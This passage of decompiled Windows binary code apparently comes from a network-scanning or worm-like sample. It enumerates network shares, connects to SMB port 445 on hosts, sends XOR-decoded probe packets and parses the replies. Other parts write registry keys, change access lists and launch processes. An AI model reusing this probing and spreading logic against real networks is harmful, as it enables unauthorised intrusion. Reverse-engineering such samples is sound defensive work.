                    v9 = WNetOpenEnumA(dwScope2, dwType, dwType, (struct _NETRESOURCEA *)&lpNetResource, (int32_t **)&lphEnum);
                    if (v9 == 0) {
                        // 0x404a3c
                        v10 = (int32_t)GlobalAlloc(64, *(int32_t *)&dwBytes);
                        g5 = v10;
                        v5 = 5;
                        // branch -> 0x404a4c
                        while (true) {
                            // 0x404a4c
                            v6 = g3;
                            v7 = v10;
                            // branch -> 0x404a4c
                            goto lab_0x404a4c_5;
                        }
                    }
                    // 0x404b3a
                    v8 = g3;
                    v3 = v8;
                    g6 = 6;
                    // branch -> 0x404b4a
                    // 0x404b4a
                    lpcCount = (struct _NETRESOURCEA *)&v4;
                    lphEnum = &v3;
                    function_402830(6, v8, (char *)&str, (int32_t)&str);
                    result = function_401f45((char *)&v1, g6);
                    // branch -> 0x404b7b
                    // 0x404b7b
                    return result;
                }
            }
            // 0x404a1d
            v2 = 1;
            // branch -> 0x404a24
            // 0x404a24
            dwBytes = (char *)&lphEnum;
            lpcCount = (struct _NETRESOURCEA *)&lpNetResource;
            dwType = g3;
            lphEnum = dwType;
            v9 = WNetOpenEnumA(dwScope2, dwType, dwType, (struct _NETRESOURCEA *)&lpNetResource, (int32_t **)&lphEnum);
            if (v9 == 0) {
                // 0x404a3c
                v10 = (int32_t)GlobalAlloc(64, *(int32_t *)&dwBytes);
                g5 = v10;
                v5 = 5;
                // branch -> 0x404a4c
                while (true) {
                    // 0x404a4c
                    v6 = g3;
                    v7 = v10;
                    // branch -> 0x404a4c
                    goto lab_0x404a4c_5;
                }
            }
        }
    }
    // 0x404b3a
    v8 = g3;
    v3 = v8;
    g6 = 6;
    // branch -> 0x404b4a
    // 0x404b4a
    lpcCount = (struct _NETRESOURCEA *)&v4;
    lphEnum = &v3;
    function_402830(6, v8, (char *)&str, (int32_t)&str);
    result = function_401f45((char *)&v1, g6);
    // branch -> 0x404b7b
    // 0x404b7b
    return result;
}

// Address range: 0x404b80 - 0x404ba7
int32_t function_404b80(int32_t a1, int32_t a2) {
    // 0x404b80
    int32_t result;
    if (g62 != 1) {
        // 0x404b9c
        result = function_404ba8((int16_t *)a1, a2);
        // branch -> 0x404ba5
    } else {
        // 0x404b8d
        result = function_404dde(a1 + 2, (struct fd_set *)a2);
        // branch -> 0x404ba5
    }
    // 0x404ba5
    return result;
}

// Address range: 0x404ba8 - 0x404ddd
int32_t function_404ba8(int16_t * str2, int32_t a2) {
    struct in_addr in; // 0x404bd2
    char * str3 = (char *)a2;
    int32_t v1 = (int32_t)str2; // 0x404bb1
    char * v2 = (char *)g5; // bp-1112
    struct hostent * v3 = gethostbyname((char *)(v1 + 2)); // 0x404bbb
    int16_t * v4; // bp-1124
    int32_t str; // bp-76
    if (v3 == NULL) {
        // 0x404be9
        str = 0;
        strcpy((char *)&str, (char *)&g68);
        // branch -> 0x404bf9
    } else {
        int32_t v5 = *(int32_t *)((int32_t)v3 + 12); // 0x404bcb
        in = (struct in_addr){
            .e0 = 0
        };
        in.e0 = *(int32_t *)*(int32_t *)v5;
        char * v6 = inet_ntoa(in); // 0x404bd2
        v4 = (int16_t *)&str;
        sprintf((char *)&str, "[%s:", v6);
        // branch -> 0x404bf9
    }
    // 0x404bf9
    if ((char)str == 0) {
        // 0x404bff
        strcpy((char *)&str, "[Err:");
        // branch -> 0x404c0f
    }
    int32_t * moduleHandle = LoadLibraryA("Netapi32"); // 0x404c14
    int16_t * v7; // bp-1128
    int32_t chars_printed; // 0x404ddd
    int16_t * v8; // 0x404ddb
    if (moduleHandle != NULL) {
        int32_t (*func)() = GetProcAddress(moduleHandle, "NetServerGetInfo"); // 0x404c3d
        if (func != NULL) {
            int32_t CodePage = 0; // edi
            int16_t * v9; // bp-1120
            int16_t * format2; // 0x404dd4
            if (GetProcAddress(moduleHandle, "NetApiBufferFree") == NULL) {
                // 0x404dc8
                v9 = (int16_t *)"%sAddrErr]";
                format2 = (int16_t *)"%sAddrErr]";
                // branch -> 0x404dd1
            } else {
                int32_t format = 0; // bp-588
                *(int32_t *)&v4 = v1;
                int32_t cbMultiByte = strlen((char *)str2) + 1; // 0x404c80
                v4 = (int16_t *)cbMultiByte;
                v7 = NULL;
                *(int32_t *)&v7 = v1;
                int16_t * lpWideCharStr = (int16_t *)&format; // 0x404c87
                MultiByteToWideChar(CodePage, CodePage, (char *)str2, cbMultiByte, lpWideCharStr, (int32_t)(struct timeval *)512);
                int32_t wstr = 0; // bp-1100
                v4 = (int16_t *)&wstr;
                swprintf((int16_t *)&wstr, (int32_t)L"%s", (int16_t *)&format);
                v9 = (int16_t *)101;
                v4 = (int16_t *)&wstr;
                v7 = (int16_t *)0x404cb9;
                __pseudo_call((int32_t)func);
                format2 = (int16_t *)101;
                // branch -> 0x404dd1
            }
            // 0x404dd1
            v4 = (int16_t *)a2;
            // branch -> 0x404dd9
            // 0x404dd9
            g5 = (int32_t)v7;
            g6 = (int32_t)v4;
            g3 = (int32_t)v9;
            return sprintf(str3, (char *)format2);
        }
        // 0x404c46
        // branch -> 0x404dd1
        // 0x404dd1
        v4 = (int16_t *)a2;
        chars_printed = sprintf(str3, (char *)(int16_t *)"%sNetServerGetInfo");
        v8 = (int16_t *)"%sNetServerGetInfo";
        // branch -> 0x404dd9
    } else {
        // 0x404c20
        chars_printed = sprintf(str3, "%sLibErr]", v2);
        v8 = (int16_t *)a2;
        // branch -> 0x404dd9
    }
    // 0x404dd9
    g5 = (int32_t)v7;
    g6 = (int32_t)v4;
    g3 = (int32_t)v8;
    return chars_printed;
}

// Address range: 0x404dde - 0x404fd0
int32_t function_404dde(int32_t a1, struct fd_set * str3) {
    struct in_addr in; // 0x404e6a
    struct sockaddr * name = (struct sockaddr *)a1;
    int32_t v1 = g2; // bp-4
    g2 = &v1;
    int32_t v2 = g3; // 0x404de7
    int32_t v3 = g6; // 0x404de8
    int32_t v4 = g5; // 0x404de9
    int16_t * v5; // bp-200
    int32_t v6 = (int32_t)&v5; // 0x404df2
    _memcpy((char *)&v5, (char *)&g19, 34);
    v5 = (int16_t *)(int32_t)*(int16_t *)&g19;
    char * v7; // bp-372
    int32_t v8 = (int32_t)&v7; // 0x404e04
    _memcpy((char *)&v7, (char *)&g18, (int32_t)(struct timeval *)42);
    v7 = (char *)(int32_t)*(char *)&g18;
    int16_t * v9; // bp-596
    int32_t v10 = (int32_t)&v9; // 0x404e15
    int32_t v11 = 0; // eax
    _memcpy((char *)&v9, (char *)&g17, (int32_t)(struct timeval *)55);
    v9 = (int16_t *)(int32_t)*(int16_t *)&g17;
    int32_t v12 = v10 | 2; // 0x404e1f
    *(char *)v12 = *(char *)((int32_t)&g17 + 2);
    char * v13 = (char *)(v11 - 196 + g2); // 0x404e22
    *v13 = *v13 ^ -109;
    int32_t v14 = v11 + 1; // 0x404e2a
    // branch -> 0x404e22
    while (v14 < 137) {
        // 0x404e22
        v13 = (char *)(v14 - 196 + g2);
        *v13 = *v13 ^ -109;
        v14++;
        // continue -> 0x404e22
    }
    char * v15 = (char *)(g2 - 368); // 0x404e34
    *v15 = *v15 ^ -109;
    int32_t v16 = 1; // 0x404e3c
    // branch -> 0x404e34
    while (v16 < 168) {
        // 0x404e34
        v15 = (char *)(v16 - 368 + g2);
        *v15 = *v15 ^ -109;
        v16++;
        // continue -> 0x404e34
    }
    char * v17 = (char *)(g2 - 592); // 0x404e46
    *v17 = *v17 ^ -109;
    int32_t v18 = 1; // 0x404e4e
    // branch -> 0x404e46
    while (v18 < 222) {
        // 0x404e46
        v17 = (char *)(v18 - 592 + g2);
        *v17 = *v17 ^ -109;
        v18++;
        // continue -> 0x404e46
    }
    struct hostent * v19 = gethostbyname((char *)name); // 0x404e59
    struct timeval * str2 = (struct timeval *)&g68;
    if (v19 != NULL) {
        int32_t v20 = *(int32_t *)((int32_t)v19 + 12); // 0x404e63
        in = (struct in_addr){
            .e0 = 0
        };
        in.e0 = *(int32_t *)*(int32_t *)v20;
        str2 = (struct timeval *)inet_ntoa(in);
        // branch -> 0x404e78
    }
    // 0x404e78
    int32_t str; // bp-60
    int32_t v21 = &str; // 0x404e78
    strcpy((char *)&str, (char *)str2);
    g4 = (int32_t)str2;
    if ((char)str == 0) {
        int32_t dest_str = (int32_t)strcpy((char *)str3, "[Can'tGetIP]"); // 0x404e91
        // branch -> 0x404fcc
        // 0x404fcc
        g5 = v4;
        g6 = v3;
        g3 = v2;
        g2 = v1;
        return dest_str;
    }
    // 0x404e9d
    g5 = 1;
    int32_t v22 = 2; // ebx
    int32_t sock_fd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP); // 0x404ea7
    g6 = sock_fd;
    if (sock_fd == -1) {
        int32_t chars_printed = sprintf((char *)*(int32_t *)&str3, "[%s:SOCKET_ERROR]", &str); // 0x404ec0
        // branch -> 0x404fcc
        // 0x404fcc
        g5 = v4;
        g6 = v3;
        g3 = v2;
        g2 = v1;
        return chars_printed;
    }
    struct fd_set * addr = (struct fd_set *)v22; // bp-28
    htons(445);
    inet_addr((char *)&str);
    int32_t v23; // bp-20
    memset(&v23, 0, 8);
    name = (struct sockaddr *)g5;
    ioctlsocket(g6, -0x7ffb9982, (int32_t *)&name);
    struct fd_set * timeout = (struct fd_set *)v22; // bp-12
    struct sockaddr * writefds = (struct sockaddr *)g5; // bp-856
    connect(g6, (struct sockaddr *)&addr, 16);
    int32_t nfds = g6 + 1; // 0x404f3e
    int32_t v24 = select(nfds, NULL, (struct fd_set *)&writefds, NULL, (struct timeval *)&timeout); // 0x404f44
    int32_t result; // 0x404fd0
    if (v24 >= 1) {
        int32_t v25 = (int32_t)str3; // 0x404f7a
        if (function_404fd1((struct timeval *)g6, v6, 137, v21, v25, g5) != 0) {
            // 0x404f86
            if (function_404fd1((struct timeval *)g6, v8, 168, v21, v25, g3) != 0) {
                // 0x404fa7
                function_404fd1((struct timeval *)g6, v10, 222, v21, v25, 3);
                // branch -> 0x404fc5
                // 0x404fc5
                result = closesocket(g6);
                // branch -> 0x404fcc
            } else {
                result = 0;
            }
        } else {
            result = 0;
        }
    } else {
        // 0x404f4e
        sprintf((char *)*(int32_t *)&str3, "[%s:Unconnect]", &str);
        // branch -> 0x404fc5
        // 0x404fc5
        result = closesocket(g6);
        // branch -> 0x404fcc
    }
    // 0x404fcc
    g5 = v4;
    g6 = v3;
    g3 = v2;
    g2 = v1;
    return result;
}

// Address range: 0x404fd1 - 0x405119
int32_t function_404fd1(struct timeval * a1, int32_t a2, int32_t a3, int32_t a4, int32_t str, int32_t a6) {
    int32_t v1 = 0; // edx
    g1 = 0x1120;
    function_405a10();
    int32_t buf = (int32_t)a1; // 0x404fe0
    int32_t timeout = g5; // bp-16
    int32_t sock = 1; // edi
    struct timeval * v2 = (struct timeval *)1; // bp-8
    ioctlsocket(buf, -0x7ffb9982, (int32_t *)&v2);
    timeout = 2;
    struct timeval * writefds = (struct timeval *)sock; // bp-292
    struct timeval * v3 = (struct timeval *)buf; // bp-32
    int32_t * length;
    send(sock, (char *)buf, (int32_t)&length, (int32_t)&length);
    int32_t nfds = buf + 1; // 0x405025
    g4 = (int32_t)&writefds;
    v3 = NULL;
    if (select(nfds, NULL, (struct fd_set *)&writefds, NULL, (struct timeval *)&timeout) < 1) {
        // 0x4050ac
        sprintf((char *)str, (char *)(struct fd_set *)"[%s:SendError]");
        closesocket(buf);
        // branch -> 0x4050fe
        // 0x4050fe
        g5 = timeout;
        g6 = 0;
        g3 = (int32_t)v2;
        return 0;
    }
    // 0x405049
    v2 = (struct timeval *)sock;
    ioctlsocket(buf, -0x7ffb9982, (int32_t *)&v2);
    v3 = (struct timeval *)&writefds;
    timeout = 4;
    writefds = (struct timeval *)sock;
    int32_t v4 = select(sock, (struct fd_set *)buf, (struct fd_set *)&length, (struct fd_set *)&length, (struct timeval *)&length); // 0x405081
    if (v4 >= 1) {
        // 0x40508b
        v3 = (struct timeval *)buf;
        int32_t buf2; // bp-4388
        if (recv(buf, (char *)&buf2, 1600, 0) != -1) {
            // 0x4050c3
            if (a6 == 3) {
                // 0x4050c9
                int32_t v5; // bp-4340
                int32_t v6 = &v5; // 0x4050cb
                g4 = v6;
                unsigned char v7 = *(char *)v6; // 0x4050d1
                v1 = v1 & -256 | (int32_t)v7;
                *(char *)(g2 - 28) = v7;
                int32_t v8 = 0; // 0x4050d7
                int32_t v9 = v8 + 1; // 0x4050d7
                int32_t v10 = g4 + 2; // 0x4050d9
                g4 = v10;
                // branch -> 0x4050d1
                while (v9 < 12) {
                    // 0x4050d1
                    v7 = *(char *)v10;
                    v1 = v1 & -256 | (int32_t)v7;
                    *(char *)(v9 - 28 + g2) = v7;
                    v8 = v9;
                    v9 = v8 + 1;
                    v10 = g4 + 2;
                    g4 = v10;
                    // continue -> 0x4050d1
                }
                // 0x4050df
                *(char *)(v8 - 27 + g2) = 0;
                v3 = (struct timeval *)str;
                sprintf((char *)str, "[%s:%s]", (struct fd_set *)a4, &v3);
                // branch -> 0x4050fc
            }
            // 0x4050fc
            // branch -> 0x4050fe
            // 0x4050fe
            g5 = timeout;
            g6 = 0;
            g3 = (int32_t)v2;
            return sock;
        }
    }
    // 0x4050ac
    sprintf((char *)str, (char *)(struct fd_set *)"[%s:RcvError]");
    closesocket(buf);
    // branch -> 0x4050fe
    // 0x4050fe
    g5 = timeout;
    g6 = 0;
    g3 = (int32_t)v2;
    return 0;
}

// Address range: 0x40511a - 0x405907
int32_t function_40511a(struct _STARTUPINFOA * str) {
    struct _STARTUPINFOA * v1 = str;
    int32_t v2 = g2; // 0x40511a
    int32_t v3 = g5; // 0x405125
    int32_t * moduleHandle = LoadLibraryA("Kernel32.dll"); // 0x40512b
    int32_t func = (int32_t)GetProcAddress(moduleHandle, "SetCurrentDirectoryA"); // 0x405139
    FreeLibrary(moduleHandle);
    int32_t lpCommandLine = (int32_t)str;
    int32_t v4 = 0; // ebx
    int32_t lpProcessInformation; // bp-20
    int32_t lpStartupInfo; // bp-88
    int32_t dwCreationFlags; // 0x4051e0
    bool result; // 0x4051ea
    char * lpApplicationName; // 0x4051e0
    struct _SECURITY_ATTRIBUTES * lpProcessAttributes; // 0x4051e4
    if (strstr((char *)str, "\\\\") != NULL) {
        // 0x40511a
        // branch -> 0x4051be
        // 0x4051be
        memset(&lpStartupInfo, 0, 68);
        dwCreationFlags = v4;
        lpApplicationName = (char *)dwCreationFlags;
        lpProcessAttributes = (struct _SECURITY_ATTRIBUTES *)dwCreationFlags;
        result = CreateProcessA(lpApplicationName, (char *)lpCommandLine, lpProcessAttributes, lpProcessAttributes, (dwCreationFlags & 1) != 0, dwCreationFlags, (int32_t *)dwCreationFlags, lpApplicationName, (struct _STARTUPINFOA *)&lpStartupInfo, (struct _PROCESS_INFORMATION *)&lpProcessInformation);
        g5 = v3;
        g2 = v2;
        return result;
    }
    int32_t str2 = 0; // bp-600
    strcpy((char *)&str2, (char *)str);
    int32_t found_char_pos = (int32_t)strchr((char *)&str2, 34); // 0x40517c
    if (found_char_pos == v4) {
        // 0x4051be
        memset(&lpStartupInfo, found_char_pos, 68);
        dwCreationFlags = v4;
        lpApplicationName = (char *)dwCreationFlags;
        lpProcessAttributes = (struct _SECURITY_ATTRIBUTES *)dwCreationFlags;
        result = CreateProcessA(lpApplicationName, (char *)lpCommandLine, lpProcessAttributes, lpProcessAttributes, (dwCreationFlags & 1) != 0, dwCreationFlags, (int32_t *)dwCreationFlags, lpApplicationName, (struct _STARTUPINFOA *)&lpStartupInfo, (struct _PROCESS_INFORMATION *)&lpProcessInformation);
        g5 = v3;
        g2 = v2;
        return result;
    }
    char * found_char_pos2 = strchr((char *)(found_char_pos + 1), 34); // 0x405189
    int32_t v5 = (int32_t)found_char_pos2; // 0x405189
    if (v5 == v4) {
        // 0x4051be
        memset(&lpStartupInfo, v5, 68);
        dwCreationFlags = v4;
        lpApplicationName = (char *)dwCreationFlags;
        lpProcessAttributes = (struct _SECURITY_ATTRIBUTES *)dwCreationFlags;
        result = CreateProcessA(lpApplicationName, (char *)lpCommandLine, lpProcessAttributes, lpProcessAttributes, (dwCreationFlags & 1) != 0, dwCreationFlags, (int32_t *)dwCreationFlags, lpApplicationName, (struct _STARTUPINFOA *)&lpStartupInfo, (struct _PROCESS_INFORMATION *)&lpProcessInformation);
        g5 = v3;
        g2 = v2;
        return result;
    }
    // 0x405191
    *found_char_pos2 = (char)v4;
    char * found_char_pos3 = strrchr((char *)&str2, 92); // 0x40519c
    int32_t v6 = (int32_t)found_char_pos3; // 0x40519c
    int32_t v7; // 0x4051c3
    int32_t lpCommandLine2; // 0x4051e610
    if (v6 != v4) {
        char v8 = v4; // 0x4051b3
        int32_t v9;
        if (*(char *)(v6 - 1) != 58) {
            // 0x4051b3
            *found_char_pos3 = v8;
            v9 = lpCommandLine;
            // branch -> 0x4051b5
        } else {
            // 0x4051ae
            *(char *)(v6 + 1) = v8;
            v9 = *(int32_t *)&v1;
            // branch -> 0x4051b5
        }
        // 0x4051b5
        __pseudo_call(func);
        lpCommandLine2 = v9;
        v7 = v4;
        // branch -> 0x4051be
    } else {
        lpCommandLine2 = lpCommandLine;
        v7 = v6;
    }
    // 0x4051be
    lpStartupInfo = 0;
    memset(&lpStartupInfo, v7, 68);
    lpProcessInformation = 0;
    dwCreationFlags = v4;
    lpApplicationName = (char *)dwCreationFlags;
    lpProcessAttributes = (struct _SECURITY_ATTRIBUTES *)dwCreationFlags;
    result = CreateProcessA(lpApplicationName, (char *)lpCommandLine2, lpProcessAttributes, lpProcessAttributes, (dwCreationFlags & 1) != 0, dwCreationFlags, (int32_t *)dwCreationFlags, lpApplicationName, (struct _STARTUPINFOA *)&lpStartupInfo, (struct _PROCESS_INFORMATION *)&lpProcessInformation);
    g5 = v3;
    g2 = v2;
    return result;
}

// Address range: 0x405908 - 0x405956
int32_t function_405908(int32_t * hKey, int32_t a2, int32_t lpValueName, int32_t dwType, int32_t lpData, int32_t cbData, int32_t a7) {
    char * lpSubKey = (char *)a2;
    char * phkResult = lpSubKey;
    if (RegOpenKeyExA(hKey, lpSubKey, 0, 0xf003f, (int32_t **)&phkResult) != 0) {
        // 0x405926
        return 0;
    }
    int32_t hKey2 = *(int32_t *)&phkResult; // 0x40593913
    int32_t v1 = RegSetValueExA((int32_t *)hKey2, (char *)lpValueName, 0, dwType, (char *)lpData, cbData); // 0x40593c
    RegCloseKey((int32_t *)*(int32_t *)&phkResult);
    return v1 == 0;
}

// Address range: 0x405957 - 0x4059b1
int32_t function_405957(int32_t * hKey, int32_t lpSubKey, int32_t lpSubKey2) {
    int32_t phkResult2 = (int32_t)hKey;
    struct _SECURITY_ATTRIBUTES * phkResult = (struct _SECURITY_ATTRIBUTES *)lpSubKey;
    int32_t Reserved = 0; // edi
    int32_t result; // 0x4059b1
    if (RegOpenKeyExA(hKey, (char *)lpSubKey, 0, 0xf003f, (int32_t **)&phkResult) == 0) {
        int32_t v1 = *(int32_t *)&phkResult; // 0x40598b11
        int32_t v2 = RegCreateKeyExA(&((struct _SECURITY_ATTRIBUTES *)v1)->e0, (char *)lpSubKey2, Reserved, (char *)Reserved, Reserved, 0xf003f, (struct _SECURITY_ATTRIBUTES *)Reserved, (int32_t **)&phkResult2, (int32_t *)Reserved); // 0x40598e
        RegCloseKey(&phkResult->e0);
        RegCloseKey((int32_t *)phkResult2);
        result = v2 == Reserved;
        // branch -> 0x4059ae
    } else {
        // 0x405979
        result = 0;
        // branch -> 0x4059ae
    }
    // 0x4059ae
    return result;
}

// Address range: 0x4059b2 - 0x4059b7
int32_t _SetSecurityInfo(int32_t * handle, int32_t ObjectType, int32_t SecurityInfo, int32_t * psidOwner, int32_t * psidGroup, struct _ACL * pDacl, struct _ACL * pSacl) {
    // 0x4059b2
    return SetSecurityInfo(handle, ObjectType, SecurityInfo, psidOwner, psidGroup, pDacl, pSacl);
}

// Address range: 0x4059b8 - 0x4059bd
int32_t _SetEntriesInAclA(int32_t cCountOfExplicitEntries, struct _EXPLICIT_ACCESS_A * pListOfExplicitEntries, struct _ACL * OldAcl, struct _ACL ** NewAcl) {
    // 0x4059b8
    return SetEntriesInAclA(cCountOfExplicitEntries, pListOfExplicitEntries, OldAcl, NewAcl);
}

// Address range: 0x4059be - 0x4059c3
int32_t _WNetCloseEnum(int32_t * hEnum) {
    // 0x4059be
    return WNetCloseEnum(hEnum);
}

// Address range: 0x4059c4 - 0x4059c9
int32_t _WNetEnumResourceA(int32_t * hEnum, int32_t * lpcCount, int32_t * lpBuffer, int32_t * lpBufferSize) {
    // 0x4059c4
    return WNetEnumResourceA(hEnum, lpcCount, lpBuffer, lpBufferSize);
}

// Address range: 0x4059ca - 0x4059cf
int32_t _WNetOpenEnumA(int32_t dwScope, int32_t dwType, int32_t dwUsage, struct _NETRESOURCEA * lpNetResource, int32_t ** lphEnum) {
    // 0x4059ca
    return WNetOpenEnumA(dwScope, dwType, dwUsage, lpNetResource, lphEnum);
}

// Address range: 0x4059d0 - 0x4059df
int32_t ___CxxFrameHandler(int32_t * pExcept, int32_t * pRN, int32_t * pContext, int32_t * pDC) {
    // 0x4059d0
    return __CxxFrameHandler(pExcept, pRN, pContext, pDC);
}

// Address range: 0x4059e0 - 0x4059e5
int32_t __EH_prolog(void) {
    // 0x4059e0
    return _EH_prolog();
}

// Address range: 0x4059e6 - 0x4059eb
char * _strcat(char * dest, char * src) {
    // 0x4059e6
    return strcat(dest, src);
}

// Address range: 0x4059ec - 0x4059f1
char * _strcpy(char * dest, char * src) {
    // 0x4059ec
    return strcpy(dest, src);
}

// Address range: 0x4059f2 - 0x4059f7
int32_t _strlen(char * s) {
    // 0x4059f2
    return strlen(s);
}

// Address range: 0x4059f8 - 0x4059fd
int32_t * _memset(int32_t * s, int32_t c, int32_t n) {
    // 0x4059f8
    return memset(s, c, n);
}

// Address range: 0x4059fe - 0x405a0f
int32_t * _memcpy_1(int32_t * dest, int32_t * src, int32_t n) {
    // 0x4059fe
    return memcpy(dest, src, n);
}

// Address range: 0x405a10 - 0x405a3f
int32_t function_405a10(void) {
    // 0x405a10
    int32_t v1;
    int32_t v2 = &v1; // 0x405a16
    int32_t result;
    if (g1 < 0x1000) {
        // 0x405a30
        *(int32_t *)(v2 - g1 - 4) = result;
        return result;
    }
    int32_t v3 = v2 - 0x1000; // 0x405a1c
    int32_t v4 = g1 - 0x1000; // 0x405a22
    while (v4 >= 0x1000) {
        // 0x405a1c
        v3 -= 0x1000;
        v4 -= 0x1000;
        // continue -> 0x405a1c
    }
    // 0x405a30
    // branch -> 0x405a30
    // 0x405a30
    *(int32_t *)(v3 - v4 - 4) = result;
    return result;
}

// Address range: 0x405a40 - 0x405a45
int32_t _strcmp(char * s1, char * s2) {
    // 0x405a40
    return strcmp(s1, s2);
}

// Address range: 0x405a46 - 0x405b83
int32_t entry_point(void) {
    // entry
    abort();
    // UNREACHABLE
}

// Address range: 0x405b84 - 0x405b97
int32_t function_405b84(void) {
    int32_t v1 = *(int32_t *)(g2 - 20); // 0x405b84
    int32_t v2 = *(int32_t *)*(int32_t *)v1; // 0x405b89
    *(int32_t *)(g2 - 120) = v2;
    return _XcptFilter(v2, (int32_t *)v1);
}

// Address range: 0x405b98 - 0x405ba3
void function_405b98(int32_t Code) {
    // 0x405b98
    *(int32_t *)(*(int32_t *)(g2 - 24) - 4) = *(int32_t *)(g2 - 120);
    _exit(Code);
}

// Address range: 0x405ba4 - 0x405ba9
int32_t __XcptFilter(int32_t xcptnum, int32_t * pxcptinfoptrs) {
    // 0x405ba4
    return _XcptFilter(xcptnum, pxcptinfoptrs);
}

// Address range: 0x405baa - 0x405baf
void __initterm(void (**First)(), void (**Last)()) {
    // 0x405baa
    _initterm(First, Last);
}

// Address range: 0x405bb0 - 0x405bc4
int32_t function_405bb0(void) {
    // 0x405bb0
    return _controlfp(0x10000, 0x30000);
}

// Address range: 0x405bc5 - 0x405bc5
int32_t function_405bc5(void) {
    // 0x405bc5
    return g1;
}

// Address range: 0x405bc6 - 0x405bcb
int32_t __except_handler3(struct _EXCEPTION_RECORD * exception_record, int32_t registration, struct _CONTEXT * context, int32_t dispatcher) {
    // 0x405bc6
    return _except_handler3(exception_record, registration, context, dispatcher);
}

// Address range: 0x405bcc - 0x405bdf
int32_t __controlfp(int32_t NewValue, int32_t Mask) {
    // 0x405bcc
    return _controlfp(NewValue, Mask);
}

// Address range: 0x405be0 - 0x405be5
bool _Process32Next(int32_t * hSnapshot, struct tagPROCESSENTRY32 * lppe) {
    // 0x405be0
    return Process32Next(hSnapshot, lppe);
}

// Address range: 0x405be6 - 0x405beb
bool _Process32First(int32_t * hSnapshot, struct tagPROCESSENTRY32 * lppe) {
    // 0x405be6
    return Process32First(hSnapshot, lppe);
}

// Address range: 0x405bec - 0x405bf3
int32_t * _CreateToolhelp32Snapshot(int32_t dwFlags, int32_t th32ProcessID) {
    // 0x405bec
    return CreateToolhelp32Snapshot(dwFlags, th32ProcessID);
}

// Address range: 0x405bf4 - 0x405bfd
int32_t function_405bf4(void) {
    // 0x405bf4
    int32_t * v1;
    return __CxxFrameHandler(&v1, &v1, &v1, &v1);
}

// --------------- Dynamically Linked Functions ---------------

// EXCEPTION_DISPOSITION __CxxFrameHandler(EHExceptionRecord * pExcept, EHRegistrationNode * pRN, void * pContext, DispatcherContext * pDC);
// unsigned int __cdecl _controlfp(_In_ unsigned int NewValue, _In_ unsigned int Mask);
// int32_t _EH_prolog(void);
// int _except_handler3(PEXCEPTION_RECORD exception_record, PEXCEPTION_REGISTRATION registration, PCONTEXT context, PEXCEPTION_REGISTRATION dispatcher);
// void __cdecl _exit(_In_ int Code);
// void __cdecl _initterm(_In_ _PVFV * First, _In_ _PVFV * Last);
// char * _itoa(int value, char * str, int radix);
// int __cdecl _strnicmp(char const * String1, char const * String2, _In_ size_t MaxCount);
// int _XcptFilter(unsigned long xcptnum, void * pxcptinfoptrs);
// BOOL AdjustTokenPrivileges(_In_ HANDLE TokenHandle, _In_ BOOL DisableAllPrivileges, _In_opt_ PTOKEN_PRIVILEGES NewState, _In_ DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, _Out_opt_ PDWORD ReturnLength);
// int atoi(const char * nptr);
// BOOL CloseHandle(_In_ HANDLE hObject);
// int closesocket(_In_ SOCKET s);
// int connect(_In_ SOCKET s, const struct sockaddr * name, _In_ int namelen);
// BOOL CopyFileA(_In_ LPCSTR lpExistingFileName, _In_ LPCSTR lpNewFileName, _In_ BOOL bFailIfExists);
// BOOL CreateDirectoryA(_In_ LPCSTR lpPathName, _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes);
// HANDLE CreateEventA(_In_opt_ LPSECURITY_ATTRIBUTES lpEventAttributes, _In_ BOOL bManualReset, _In_ BOOL bInitialState, _In_opt_ LPCSTR lpName);
// HANDLE CreateFileA(_In_ LPCSTR lpFileName, _In_ DWORD dwDesiredAccess, _In_ DWORD dwShareMode, _In_opt_ LPSECURITY_ATTRIBUTES lpSecurityAttributes, _In_ DWORD dwCreationDisposition, _In_ DWORD dwFlagsAndAttributes, _In_opt_ HANDLE hTemplateFile);
// HANDLE CreateMutexA(_In_opt_ LPSECURITY_ATTRIBUTES lpMutexAttributes, _In_ BOOL bInitialOwner, _In_opt_ LPCSTR lpName);
// BOOL CreateProcessA(_In_opt_ LPCSTR lpApplicationName, _Inout_opt_ LPSTR lpCommandLine, _In_opt_ LPSECURITY_ATTRIBUTES lpProcessAttributes, _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes, _In_ BOOL bInheritHandles, _In_ DWORD dwCreationFlags, _In_opt_ LPVOID lpEnvironment, _In_opt_ LPCSTR lpCurrentDirectory, _In_ LPSTARTUPINFOA lpStartupInfo, _Out_ LPPROCESS_INFORMATION lpProcessInformation);
// HANDLE CreateThread(_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes, _In_ SIZE_T dwStackSize, _In_ LPTHREAD_START_ROUTINE lpStartAddress, _In_opt_ LPVOID lpParameter, _In_ DWORD dwCreationFlags, _Out_opt_ LPDWORD lpThreadId);
// HANDLE CreateToolhelp32Snapshot(DWORD dwFlags, DWORD th32ProcessID);
// BOOL DeleteFileA(_In_ LPCSTR lpFileName);
// BOOL DuplicateHandle(_In_ HANDLE hSourceProcessHandle, _In_ HANDLE hSourceHandle, _In_ HANDLE hTargetProcessHandle, LPHANDLE lpTargetHandle, _In_ DWORD dwDesiredAccess, _In_ BOOL bInheritHandle, _In_ DWORD dwOptions);
// VOID ExitProcess(_In_ UINT uExitCode);
// BOOL FindClose(_Inout_ HANDLE hFindFile);
// HANDLE FindFirstFileA(_In_ LPCSTR lpFileName, _Out_ LPWIN32_FIND_DATAA lpFindFileData);
// BOOL FindNextFileA(_In_ HANDLE hFindFile, _Out_ LPWIN32_FIND_DATAA lpFindFileData);
// void free(void * ptr);
// BOOL FreeLibrary(_In_ HMODULE hLibModule);
// BOOL GetComputerNameA(LPSTR lpBuffer, _Inout_ LPDWORD nSize);
// HANDLE GetCurrentProcess(VOID);
// UINT GetDriveTypeA(_In_opt_ LPCSTR lpRootPathName);
// DWORD GetFileAttributesA(_In_ LPCSTR lpFileName);
// BOOL GetFileTime(_In_ HANDLE hFile, _Out_opt_ LPFILETIME lpCreationTime, _Out_opt_ LPFILETIME lpLastAccessTime, _Out_opt_ LPFILETIME lpLastWriteTime);
// struct hostent * gethostbyname(_In_z_ const char * name);
// int gethostname(char * name, _In_ int namelen);
// DWORD GetLastError(VOID);
// DWORD GetLogicalDriveStringsA(_In_ DWORD nBufferLength, LPSTR lpBuffer);
// DWORD GetModuleFileNameA(_In_opt_ HMODULE hModule, LPSTR lpFilename, _In_ DWORD nSize);
// DWORD GetPriorityClass(_In_ HANDLE hProcess);
